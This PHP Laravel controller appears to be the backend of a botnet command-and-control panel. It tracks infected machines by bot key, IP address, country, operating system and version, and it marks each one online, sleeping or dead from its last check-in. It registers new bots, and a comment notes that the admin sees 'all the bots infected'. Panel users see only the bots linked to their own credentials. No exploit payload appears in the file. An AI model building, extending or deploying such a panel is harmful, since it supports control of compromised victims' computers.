<?php

namespace App\Http\Controllers;

use App\Bot;
use App\Connection;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;


class BotsController extends Controller
{
    public static function mainConstructor($data){
        return BotsController::getBotsInfo($data);
    }

    /**
     * Get the bots info
     *
     * @param null
     *
     * @return array
     */

    private static function getBotsInfo($data){

        $take = $data['take'];

        //Check if the user is admin
        if(Auth::user()->id === 1){
            $bots = Bot::take($take)->get();
            $count = Bot::get()->count();
        }else{
            //panelCredential
            $panelCredential = Auth::user()->panelCredential()->first();

            $bots = $panelCredential->bots()->take($take)->get();
            $count = $panelCredential->bots()->count();
        }


        $seeMore = 0;
        if($count > $take){
            $seeMore = 1;
        }

        $statusHtml = array();
        $statusHtml['on'] = '<b style="color: greenyellow; font-size: 95%; margin-top: 4px">On</b>';
        $statusHtml['sleep'] = '<b style="color: #ff9f40; font-size: 95%; margin-top: 4px">Zzzz</b>';
        $statusHtml['dead'] = '<b style="color: red; font-size: 95%; margin-top: 4px">Dead</b>';

        $data = array();
        $i = 0;
        foreach ($bots as $bot){

            switch (BotsController::getBotStatus($bot['id'])){
                case 'on';
                    $status = $statusHtml['on'];
                    break;
                case 'sleep';
                    $status = $statusHtml['sleep'];
                    break;
                case 'dead';
                    $status = $statusHtml['dead'];
                    break;
            }

            $data[$i] = [
                        'id'=>$bot['id'],
                        'botKey'=>$bot['botKey'],
                        'ip'=>$bot['ip'],
                        'country'=>$bot['country'],
                        'time_ago'=>$bot['created_at']->diffForHumans(),
                        'os'=>$bot['os'],
                        'v'=>$bot['bot_version'],
                        'status'=>$status,
                        ];
            $i++;
        }

        return ['data'=>$data, 'seeMore'=>$seeMore];
    }

    /**
     * Get the Bot status (Individual)
     *
     * @param $bot_id
     *
     * @return int
     *
     */

    private static function getBotStatus($bot_id){

        //Return type ->on(online),sleep(sleep),dead(dead)

        //Check the last connection the bot made to server
        $lastConnection = Connection::where('bot_id', $bot_id)->orderBy('created_at','desc')->first();
        $lastConnection = $lastConnection->created_at;
        //Une week Sleep time
        $sleepTime = Carbon::now()->subDays(8);
        //5 Hours
        $onlineTime = Carbon::now()->subHours(1);


        if($lastConnection > $sleepTime){
            //Check if is sleeping or online
            if($lastConnection >= $onlineTime){
                return 'on';
            }
            else{
                return 'sleep';
            }

        }else{
            return 'dead';
        }


    }

    /**
     * Get the Bots Status (All)
     *
     *@return array
     *
     */

    public static function getBotsStatus(){

        //Une week Sleep time
        $sleepTime = Carbon::now()->subDays(8);
        //5 Hours
        $onlineTime = Carbon::now()->subHours(1);
        //panelCredential
        $panelCredential = Auth::user()->panelCredential()->first();

        //TODO-> GetBots where panelKey! -> Admin will see all the bots infected! ->it is Simple!
        if(Auth::user()->id === 1){
            $allBots = Bot::get();
        }else{
            $allBots = $panelCredential->bots()->get();
        }
        $online = Connection::where('created_at', '>=', $onlineTime)->whereIn('bot_id',$allBots->pluck('id'))->groupBy('bot_id')->get();
        $sleep = Connection::where('created_at', '>=', $sleepTime)->whereIn('bot_id',$allBots->pluck('id'))->where('created_at','<',$onlineTime)->whereNotIn('bot_id',$online->pluck('bot_id'))->groupBy('bot_id')->get();
        $dead = Connection::where('created_at', '<', $sleepTime)->whereIn('bot_id',$allBots->pluck('id'))->whereNotIn('bot_id',$online->pluck('bot_id'))->whereNotIn('bot_id',$sleep->pluck('bot_id'))->groupBy('bot_id')->get();

        //Create the return array
        $return = ['bots'=>$allBots->count(),'online'=>$online->count(), 'sleep'=>$sleep->count(), 'dead'=>$dead->count()];

        return $return;
    }

    /**
     * Create an Bot
     *
     * @param $data
     *
     * @return array->json
     *
     */

    public static function createBot($data){

        //'botKey', 'ip', 'county', 'os', 'bot_version'
        $bot = Bot::create(['botKey'=>$data['botKey'],'ip'=>$data['ip'],'country'=>$data['country'],'os'=>$data['oS'],'bot_version'=>$data['bot_version'],'panel_credential_id'=>$data['panel_credential_id']]);

        return $bot;
    }

    /**
     * Update an Bot
     *
     * @param $data
     *
     * @return array->json
     *
     */
    public static function updateBot($data){



    }

}
